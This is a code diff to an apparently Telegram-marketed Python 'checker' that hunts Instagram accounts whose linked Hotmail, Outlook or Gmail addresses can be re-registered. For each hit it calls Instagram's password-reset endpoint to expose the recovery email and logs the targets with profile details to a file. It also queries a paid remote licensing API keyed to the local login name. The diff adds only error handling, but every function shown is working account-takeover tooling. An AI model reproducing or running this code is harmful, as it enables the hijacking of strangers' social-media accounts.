@@ -6,6 +6,7 @@ import os
 import uuid
 import sys
 import json
+
 uuid =str(os.getlogin())
 
 id1 = "-".join(uuid)
@@ -19,6 +20,7 @@ class Checker:
     def __init__(self) :
         self.idf = id1
         self.a = 0
+        self.rcol = '1234567'
         self.b = 0
         self.f = 0
         self.s = 0
@@ -32,8 +34,10 @@ class Checker:
         self.k = 0
         self.num = 0
         self.telegram = "@BBMZZ"
-        
-        print(f"\033[1;32m[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook] (Acctive) \n[5] - Gmail [new]\n[6] - Username 2010 - 2011 [new]\n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n")
+        self.nt = "Connection Error "
+        self.colr = str(''.join(random.choice(self.rcol) for i in range(1)))
+   
+        print(f"\033[1;3{self.colr}m[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook] (Acctive) \n[5] - Gmail [new]\n[6] - Username 2010 - 2011 [new]\n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n")
         self.un = input("[=] - Enter Your Number list : ")
         if self.un =="1":
             os.system('clear')
@@ -52,30 +56,41 @@ class Checker:
             #print(self.me)
             #sys.exit()
         elif self.un == "5":
-            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/bagyay/{self.idf}').text
-            print(self.url)
-            if ('"Subscription":"inactive"') in self.url:
-                os.system("clear")
-                self.pcs ='No acctive id'
-                print(self.pcs)
-                sys.exit()
-            else:
-                os.system('clear')
-                self.fir = input("[=] - Enter Your Name File : ")
-                try:
-                    self.firr = open(self.fir,'r').read().splitlines()
-                    self.gmail()
-                except FileNotFoundError as error:
-                    os.system('clear')
-                    self.erf = "The File No in Phone ."
-                    print(self.erf)
+            try:
+
+                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/bagyay/{self.idf}').text
+                print(self.url)
+                if ('"Subscription":"inactive"') in self.url:
+                    os.system("clear")
+                    self.pcs ='No acctive id'
+                    print(self.pcs)
                     sys.exit()
+                else:
+                    os.system('clear')
+                    self.fir = input("[=] - Enter Your Name File : ")
+                    try:
+                        self.firr = open(self.fir,'r').read().splitlines()
+                        self.gmail()
+                    except FileNotFoundError as error:
+                        os.system('clear')
+                        self.erf = "The File No in Phone ."
+                        print(self.erf)
+                        sys.exit()
+            except requests.exceptions.ConnectionError as error:
+                print(self.nt)
+                sys.exit()
+                pass
 
 
 
         elif self.un == "6":
-            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/akiiahhhha/{self.idf}').text
-            print(self.url)
+            try:
+
+                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/akiiahhhha/{self.idf}').text
+                print(self.url)
+            except requests.exceptions.ConnectionError as error:
+                print(self.nt)
+                sys.exit()
             if ('"Subscription":"inactive"') in self.url:
                 os.system("clear")
                 self.pcs ='No acctive id'
@@ -112,31 +127,40 @@ class Checker:
                     print(self.rt)
                     sys.exit()
     def gmail(self):
-        self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/uuyqyyq/{self.idf}').text
-        print(self.url)
+        try:
+
+            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/uuyqyyq/{self.idf}').text
+            print(self.url)
+        except requests.exceptions.ConnectionError as error:
+            print(self.nt)
+            sys.exit()
         if ('"Subscription":"inactive"') in self.url:
             os.system("clear")
             self.pcs ='No acctive id'
             print(self.pcs)
             exit()
         for self.ra in self.firr:
-            self.urli = requests.get(f"https://api-m-525f11315c3c.herokuapp.com/api/instagram/zaid.k.k/{self.ra}").text
-            if ('"status": "OK",') in self.urli:
-                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/{self.ra}/{self.idf}').text
-                if ('"status":"bad"') in self.url:
-                    self.k +=1
+            try:
+
+                self.urli = requests.get(f"https://api-m-525f11315c3c.herokuapp.com/api/instagram/zaid.k.k/{self.ra}").text
+                if ('"status": "OK",') in self.urli:
+                    self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/{self.ra}/{self.idf}').text
+                    if ('"status":"bad"') in self.url:
+                        self.k +=1
+                        os.system('clear')
+                        print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
+                    elif ('"status":"Ok"') in self.url:
+                        self.a+=1
+                        os.system('clear')
+                        print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
+                        with open('acctive.txt','a') as self.fe:
+                            self.fe.write(f'{self.ra}\n')
+                else:
+                    self.b+=1
                     os.system('clear')
                     print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
-                elif ('"status":"Ok"') in self.url:
-                    self.a+=1
-                    os.system('clear')
-                    print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
-                    with open('acctive.txt','a') as self.fe:
-                        self.fe.write(f'{self.ra}\n')
-            else:
-                self.b+=1
-                os.system('clear')
-                print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
+            except requests.exceptions.ConnectionError as error:
+                continue
     def username(self):
         global listcookies
         os.system('clear')
@@ -158,7 +182,11 @@ class Checker:
             'X-IG-Capabilities': 'AQ==',
             'Accept-Encoding': 'gzip',
             }
-            rr = requests.get(url,headers=headers).text
+            try:
+
+                rr = requests.get(url,headers=headers).text
+            except requests.exceptions.ConnectionError as error:
+                continue
             try:
                 if 'User not found' in rr:
                     self.iderr = "Tihe ID Error"
@@ -214,153 +242,169 @@ class Checker:
             sys.exit()
     def ho1(self):
         for self.ra in self.ix:
-            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
-            print(self.url)
-            if ('"Subscription":"inactive"') in self.url:
-                os.system("clear")
-                self.pcs ='No acctive id'
-                print(self.pcs)
-                exit()
-            if ('"OK"') in self.url:
-                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
+            try:
 
-                if self.url2=='ok':
-                    with open(f'acctive.txt','a') as f0:
-                        f0.write(f'{self.ra}@hotmail.com\n')
-                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
-                    head2={
-                        'accept': '*/*',
-                        'accept-encoding': 'gzip, deflate, br',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
-                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                        'sec-fetch-dest': 'empty',
-                        'sec-fetch-mode': 'cors',
-                        'sec-fetch-site': 'same-origin',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                        'viewport-width': '917',
-                        'x-asbd-id': '198387',
-                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                        'x-ig-app-id': '936619743392459',
-                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
-                        'x-instagram-ajax': '1006627630',
-                        'x-requested-with': 'XMLHttpRequest'
-                    }
-                    try:
-                        ge = requests.get(url2,headers=head2).json()
-                        id = ge['data']['user']['id']
-                        headers1 = {
-                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                                'viewport-width': '917',
-                                'x-asbd-id': '198387',
-                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                            }
-                        data3 = {
-                            'ig_sig_key_version': '4',
-                            "user_id":id
+                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
+                print(self.url)
+                if ('"Subscription":"inactive"') in self.url:
+                    os.system("clear")
+                    self.pcs ='No acctive id'
+                    print(self.pcs)
+                    exit()
+                if ('"OK"') in self.url:
+                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
+
+                    if self.url2=='ok':
+                        with open(f'acctive.txt','a') as f0:
+                            f0.write(f'{self.ra}@hotmail.com\n')
+                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
+                        head2={
+                            'accept': '*/*',
+                            'accept-encoding': 'gzip, deflate, br',
+                            'accept-language': 'en-US,en;q=0.9',
+                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
+                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
+                            'sec-ch-prefers-color-scheme': 'light',
+                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': '"Windows"',
+                            'sec-fetch-dest': 'empty',
+                            'sec-fetch-mode': 'cors',
+                            'sec-fetch-site': 'same-origin',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                            'viewport-width': '917',
+                            'x-asbd-id': '198387',
+                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                            'x-ig-app-id': '936619743392459',
+                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
+                            'x-instagram-ajax': '1006627630',
+                            'x-requested-with': 'XMLHttpRequest'
                         }
                         try:
-                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                            ge = requests.get(url2,headers=head2).json()
+                            id = ge['data']['user']['id']
+                            headers1 = {
+                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                                    'viewport-width': '917',
+                                    'x-asbd-id': '198387',
+                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                                }
+                            data3 = {
+                                'ig_sig_key_version': '4',
+                                "user_id":id
+                            }
                             try:
-                                rs =str(res['obfuscated_email'])
-                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
-                                time.sleep(2)
-                            except KeyError as error:
-                                print('error')
+                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                                try:
+                                    rs =str(res['obfuscated_email'])
+                                    print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
+                                    time.sleep(2)
+                                except KeyError as error:
+                                    print('error')
+                            except requests.exceptions.ConnectionError as error:
+                                continue
                         except requests.exceptions.ConnectionError as error:
                             continue
-                    except requests.exceptions.ConnectionError as error:
-                        continue
-                    self.a+=1
-                    os.system('cls' if os.name=='nt'else"clear")
-                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+                        self.a+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+                    else:
+                        self.s+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                 else:
-                    self.s+=1
+                    self.u+=1
                     os.system('cls' if os.name=='nt'else"clear")
                     print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
-            else:
-                self.u+=1
-                os.system('cls' if os.name=='nt'else"clear")
-                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+            except requests.exceptions.ConnectionError as error:
+                continue
         print("Complete File .")
     def out(self):
         for self.ra in self.ix:
-            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
-            if ('"Subscription":"inactive"') in self.url:
-                os.system("clear")
-                self.pcs ='No acctive id'
-                print(self.pcs)
-                exit()
+            try:
+
+                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
+                if ('"Subscription":"inactive"') in self.url:
+                    os.system("clear")
+                    self.pcs ='No acctive id'
+                    print(self.pcs)
+                    exit()
+         
+          
+    
 
 
-            elif ('"OK"') in self.url:
-                self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
-                if self.url3=='ok':
-                    with open(f'acctive.txt','a') as f0:
-                        f0.write(f'{self.ra}@outlook.com\n')
-                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
-                    head2={
-                        'accept': '*/*',
-                        'accept-encoding': 'gzip, deflate, br',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
-                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                        'sec-fetch-dest': 'empty',
-                        'sec-fetch-mode': 'cors',
-                        'sec-fetch-site': 'same-origin',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                        'viewport-width': '917',
-                        'x-asbd-id': '198387',
-                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                        'x-ig-app-id': '936619743392459',
-                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
-                        'x-instagram-ajax': '1006627630',
-                        'x-requested-with': 'XMLHttpRequest'
-                    }
-                    try:
-                        ge = requests.get(url2,headers=head2).json()
-                        id = ge['data']['user']['id']
-                        headers1 = {
-                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                                'viewport-width': '917',
-                                'x-asbd-id': '198387',
-                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                            }
-                        data3 = {
-                            'ig_sig_key_version': '4',
-                            "user_id":id
+
+
+
+
+                elif ('"OK"') in self.url:
+                    self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
+                    if self.url3=='ok':
+                        with open(f'acctive.txt','a') as f0:
+                            f0.write(f'{self.ra}@outlook.com\n')
+                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
+                        head2={
+                            'accept': '*/*',
+                            'accept-encoding': 'gzip, deflate, br',
+                            'accept-language': 'en-US,en;q=0.9',
+                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
+                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
+                            'sec-ch-prefers-color-scheme': 'light',
+                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': '"Windows"',
+                            'sec-fetch-dest': 'empty',
+                            'sec-fetch-mode': 'cors',
+                            'sec-fetch-site': 'same-origin',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                            'viewport-width': '917',
+                            'x-asbd-id': '198387',
+                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                            'x-ig-app-id': '936619743392459',
+                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
+                            'x-instagram-ajax': '1006627630',
+                            'x-requested-with': 'XMLHttpRequest'
                         }
                         try:
-                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                            ge = requests.get(url2,headers=head2).json()
+                            id = ge['data']['user']['id']
+                            headers1 = {
+                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                                    'viewport-width': '917',
+                                    'x-asbd-id': '198387',
+                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                                }
+                            data3 = {
+                                'ig_sig_key_version': '4',
+                                "user_id":id
+                            }
                             try:
-                                rs =str(res['obfuscated_email'])
-                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
-                                time.sleep(2)
-                            except KeyError as error:
-                                print('error')
+                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                                try:
+                                    rs =str(res['obfuscated_email'])
+                                    print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
+                                    time.sleep(2)
+                                except KeyError as error:
+                                    print('error')
+                            except requests.exceptions.ConnectionError as error:
+                                continue
                         except requests.exceptions.ConnectionError as error:
                             continue
-                    except requests.exceptions.ConnectionError as error:
-                        continue
-                    self.f+=1
-                    os.system('cls' if os.name=='nt'else"clear")
-                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+                        self.f+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+                    else:
+                        self.k+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                 else:
-                    self.k+=1
+                    self.e+=1
                     os.system('cls' if os.name=='nt'else"clear")
                     print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
-            else:
-                self.e+=1
-                os.system('cls' if os.name=='nt'else"clear")
-                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
+            except requests.exceptions.ConnectionError as error:
+                continue
+        
         print("Complete File .")
         
     def ran(self):
@@ -514,87 +558,91 @@ class Checker:
             print(self.err)
             sys.exit()
         for self.ra in self.ope:
-            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
-            if ('"Subscription":"inactive"') in self.url:
-                os.system("clear")
-                self.pcs ='No acctive id'
-                print(self.pcs)
-                exit()
-            elif ('"OK"') in self.url:
-                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
-                if self.url2=='ok':
-                    with open(f'acctive.txt','a') as f0:
-                        f0.write(f'{self.ra}@hotmail.com\n')
-                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
-                    head2={
-                        'accept': '*/*',
-                        'accept-encoding': 'gzip, deflate, br',
-                        'accept-language': 'en-US,en;q=0.9',
-                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
-                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-                        'sec-ch-ua-mobile': '?0',
-                        'sec-ch-ua-platform': '"Windows"',
-                        'sec-fetch-dest': 'empty',
-                        'sec-fetch-mode': 'cors',
-                        'sec-fetch-site': 'same-origin',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                        'viewport-width': '917',
-                        'x-asbd-id': '198387',
-                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                        'x-ig-app-id': '936619743392459',
-                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
-                        'x-instagram-ajax': '1006627630',
-                        'x-requested-with': 'XMLHttpRequest'
-                    }
-                    try:
-                        ge = requests.get(url2,headers=head2).json()
-                        id = ge['data']['user']['id']
-                        fol = ge['data']['user']['edge_followed_by']['count']
-                        bio = ge['data']['user']['biography']
-                        fols = ge['data']['user']['edge_follow']['count']
-                        img = ge['data']['user']['profile_pic_url']
-                        nam = ge['data']['user']['full_name']
-                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
-                        ree = rl.json()
-                        da = ree['date']
-                        headers1 = {
-                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                                'viewport-width': '917',
-                                'x-asbd-id': '198387',
-                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
-                            }
-                        data3 = {
-                            'ig_sig_key_version': '4',
-                            "user_id":id
+            try:
+
+                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
+                if ('"Subscription":"inactive"') in self.url:
+                    os.system("clear")
+                    self.pcs ='No acctive id'
+                    print(self.pcs)
+                    exit()
+                elif ('"OK"') in self.url:
+                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
+                    if self.url2=='ok':
+                        with open(f'acctive.txt','a') as f0:
+                            f0.write(f'{self.ra}@hotmail.com\n')
+                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
+                        head2={
+                            'accept': '*/*',
+                            'accept-encoding': 'gzip, deflate, br',
+                            'accept-language': 'en-US,en;q=0.9',
+                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
+                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
+                            'sec-ch-prefers-color-scheme': 'light',
+                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                            'sec-ch-ua-mobile': '?0',
+                            'sec-ch-ua-platform': '"Windows"',
+                            'sec-fetch-dest': 'empty',
+                            'sec-fetch-mode': 'cors',
+                            'sec-fetch-site': 'same-origin',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                            'viewport-width': '917',
+                            'x-asbd-id': '198387',
+                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                            'x-ig-app-id': '936619743392459',
+                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
+                            'x-instagram-ajax': '1006627630',
+                            'x-requested-with': 'XMLHttpRequest'
                         }
                         try:
-                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                            ge = requests.get(url2,headers=head2).json()
+                            id = ge['data']['user']['id']
+                            fol = ge['data']['user']['edge_followed_by']['count']
+                            bio = ge['data']['user']['biography']
+                            fols = ge['data']['user']['edge_follow']['count']
+                            img = ge['data']['user']['profile_pic_url']
+                            nam = ge['data']['user']['full_name']
+                            rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+                            ree = rl.json()
+                            da = ree['date']
+                            headers1 = {
+                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+                                    'viewport-width': '917',
+                                    'x-asbd-id': '198387',
+                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
+                                }
+                            data3 = {
+                                'ig_sig_key_version': '4',
+                                "user_id":id
+                            }
                             try:
-                                rs =str(res['obfuscated_email'])
-                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
-                                with open('acctive.txt','a',encoding="utf-8") as f0:
-                                    f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@hotmail.com\n')
-                                time.sleep(2)
-                            except KeyError as error:
-                                with open('acctive.txt','a') as f8:
-                                    f8.write(f'{self.ra}@hotmail.com\n')
+                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
+                                try:
+                                    rs =str(res['obfuscated_email'])
+                                    print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
+                                    with open('acctive.txt','a',encoding="utf-8") as f0:
+                                        f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@hotmail.com\n')
+                                    time.sleep(2)
+                                except KeyError as error:
+                                    with open('acctive.txt','a') as f8:
+                                        f8.write(f'{self.ra}@hotmail.com\n')
+                            except requests.exceptions.ConnectionError as error:
+                                continue
                         except requests.exceptions.ConnectionError as error:
                             continue
-                    except requests.exceptions.ConnectionError as error:
-                        continue
-                    self.a+=1
-                    os.system('cls' if os.name=='nt'else"clear")
-                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
+                        self.a+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
+                    else:
+                        self.s+=1
+                        os.system('cls' if os.name=='nt'else"clear")
+                        print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                 else:
-                    self.s+=1
+                    self.u+=1
                     os.system('cls' if os.name=='nt'else"clear")
                     print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
-            else:
-                self.u+=1
-                os.system('cls' if os.name=='nt'else"clear")
-                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
+            except requests.exceptions.ConnectionError as error:
+                continue
         print("Complete File .")
 
 
